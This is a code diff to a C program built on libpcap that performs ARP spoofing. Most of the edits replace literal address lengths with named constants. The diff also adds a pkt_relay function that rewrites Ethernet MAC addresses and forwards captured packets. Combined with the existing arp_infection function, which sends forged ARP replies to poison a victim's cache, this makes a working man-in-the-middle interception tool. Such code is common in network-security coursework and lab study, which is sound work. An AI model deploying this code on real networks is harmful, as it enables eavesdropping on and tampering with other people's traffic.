@@ -77,8 +77,8 @@ void make_arp(u_char *packet, uint8_t *src_mac, uint8_t *dst_mac, uint16_t op,
 	ether_header ethhdr;
 	arp_header arphdr;
 
-	memcpy(ethhdr.dst_mac, dst_mac, 6);
-	memcpy(ethhdr.src_mac, src_mac, 6);
+	memcpy(ethhdr.dst_mac, dst_mac, ADDR_LEN_MAC);
+	memcpy(ethhdr.src_mac, src_mac, ADDR_LEN_MAC);
 	ethhdr.ether_type = htons(ETHERTYPE_ARP);
 
 	arphdr.hw_type = htons(HWTYPE_ETHER);
@@ -86,10 +86,10 @@ void make_arp(u_char *packet, uint8_t *src_mac, uint8_t *dst_mac, uint16_t op,
 	arphdr.hw_addr_len = ADDR_LEN_MAC;
 	arphdr.proto_addr_len = ADDR_LEN_IP;
 	arphdr.op = htons(op);
-	memcpy(arphdr.send_mac, send_mac, 6);
-	memcpy(arphdr.send_ip, send_ip, 4);
-	memcpy(arphdr.tar_mac, tar_mac, 6);
-	memcpy(arphdr.tar_ip, tar_ip, 4);
+	memcpy(arphdr.send_mac, send_mac, ADDR_LEN_MAC);
+	memcpy(arphdr.send_ip, send_ip, ADDR_LEN_IP);
+	memcpy(arphdr.tar_mac, tar_mac, ADDR_LEN_MAC);
+	memcpy(arphdr.tar_ip, tar_ip, ADDR_LEN_IP);
 
 	memcpy(packet, (u_char*)&ethhdr, sizeof(ethhdr));
 	memcpy(packet + sizeof(ethhdr), (u_char*)&arphdr, sizeof(arphdr));
@@ -115,9 +115,9 @@ void get_mac_addr(uint8_t *ip_addr)
 
 		if((ntohs(ethhdr->ether_type) == ETHERTYPE_ARP) && 
 	   	   (ntohs(arphdr->op) == ARP_REPLY) &&
-	   	   (!memcmp(arphdr->send_ip, ip_addr, 4))) 
+	   	   (!memcmp(arphdr->send_ip, ip_addr, ADDR_LEN_IP))) 
 		{
-			memcpy(ip2mac[*(uint32_t*)ip_addr], arphdr->send_mac, 6);
+			memcpy(ip2mac[*(uint32_t*)ip_addr], arphdr->send_mac, ADDR_LEN_MAC);
 			break;
 		}
 	}
@@ -131,5 +131,14 @@ void arp_infection(session s)
 		 ARP_REPLY, my_mac, (uint8_t*)&s.tar_ip, 
 		 ip2mac[s.send_ip], (uint8_t*)&s.send_ip);
 	pcap_sendpacket(handle, send_pkt, ARP_PACKET_SIZE);
+}
+
+void pkt_relay(const u_char *pkt, uint32_t len, session s)
+{
+	ether_header *ethhdr = (ether_header*)pkt;
+	
+	memcpy(ethhdr->src_mac, my_mac, ADDR_LEN_MAC);
+	memcpy(ethhdr->dst_mac, ip2mac[s.tar_ip], ADDR_LEN_MAC);
+	pcap_sendpacket(handle, pkt, len);
 }
 
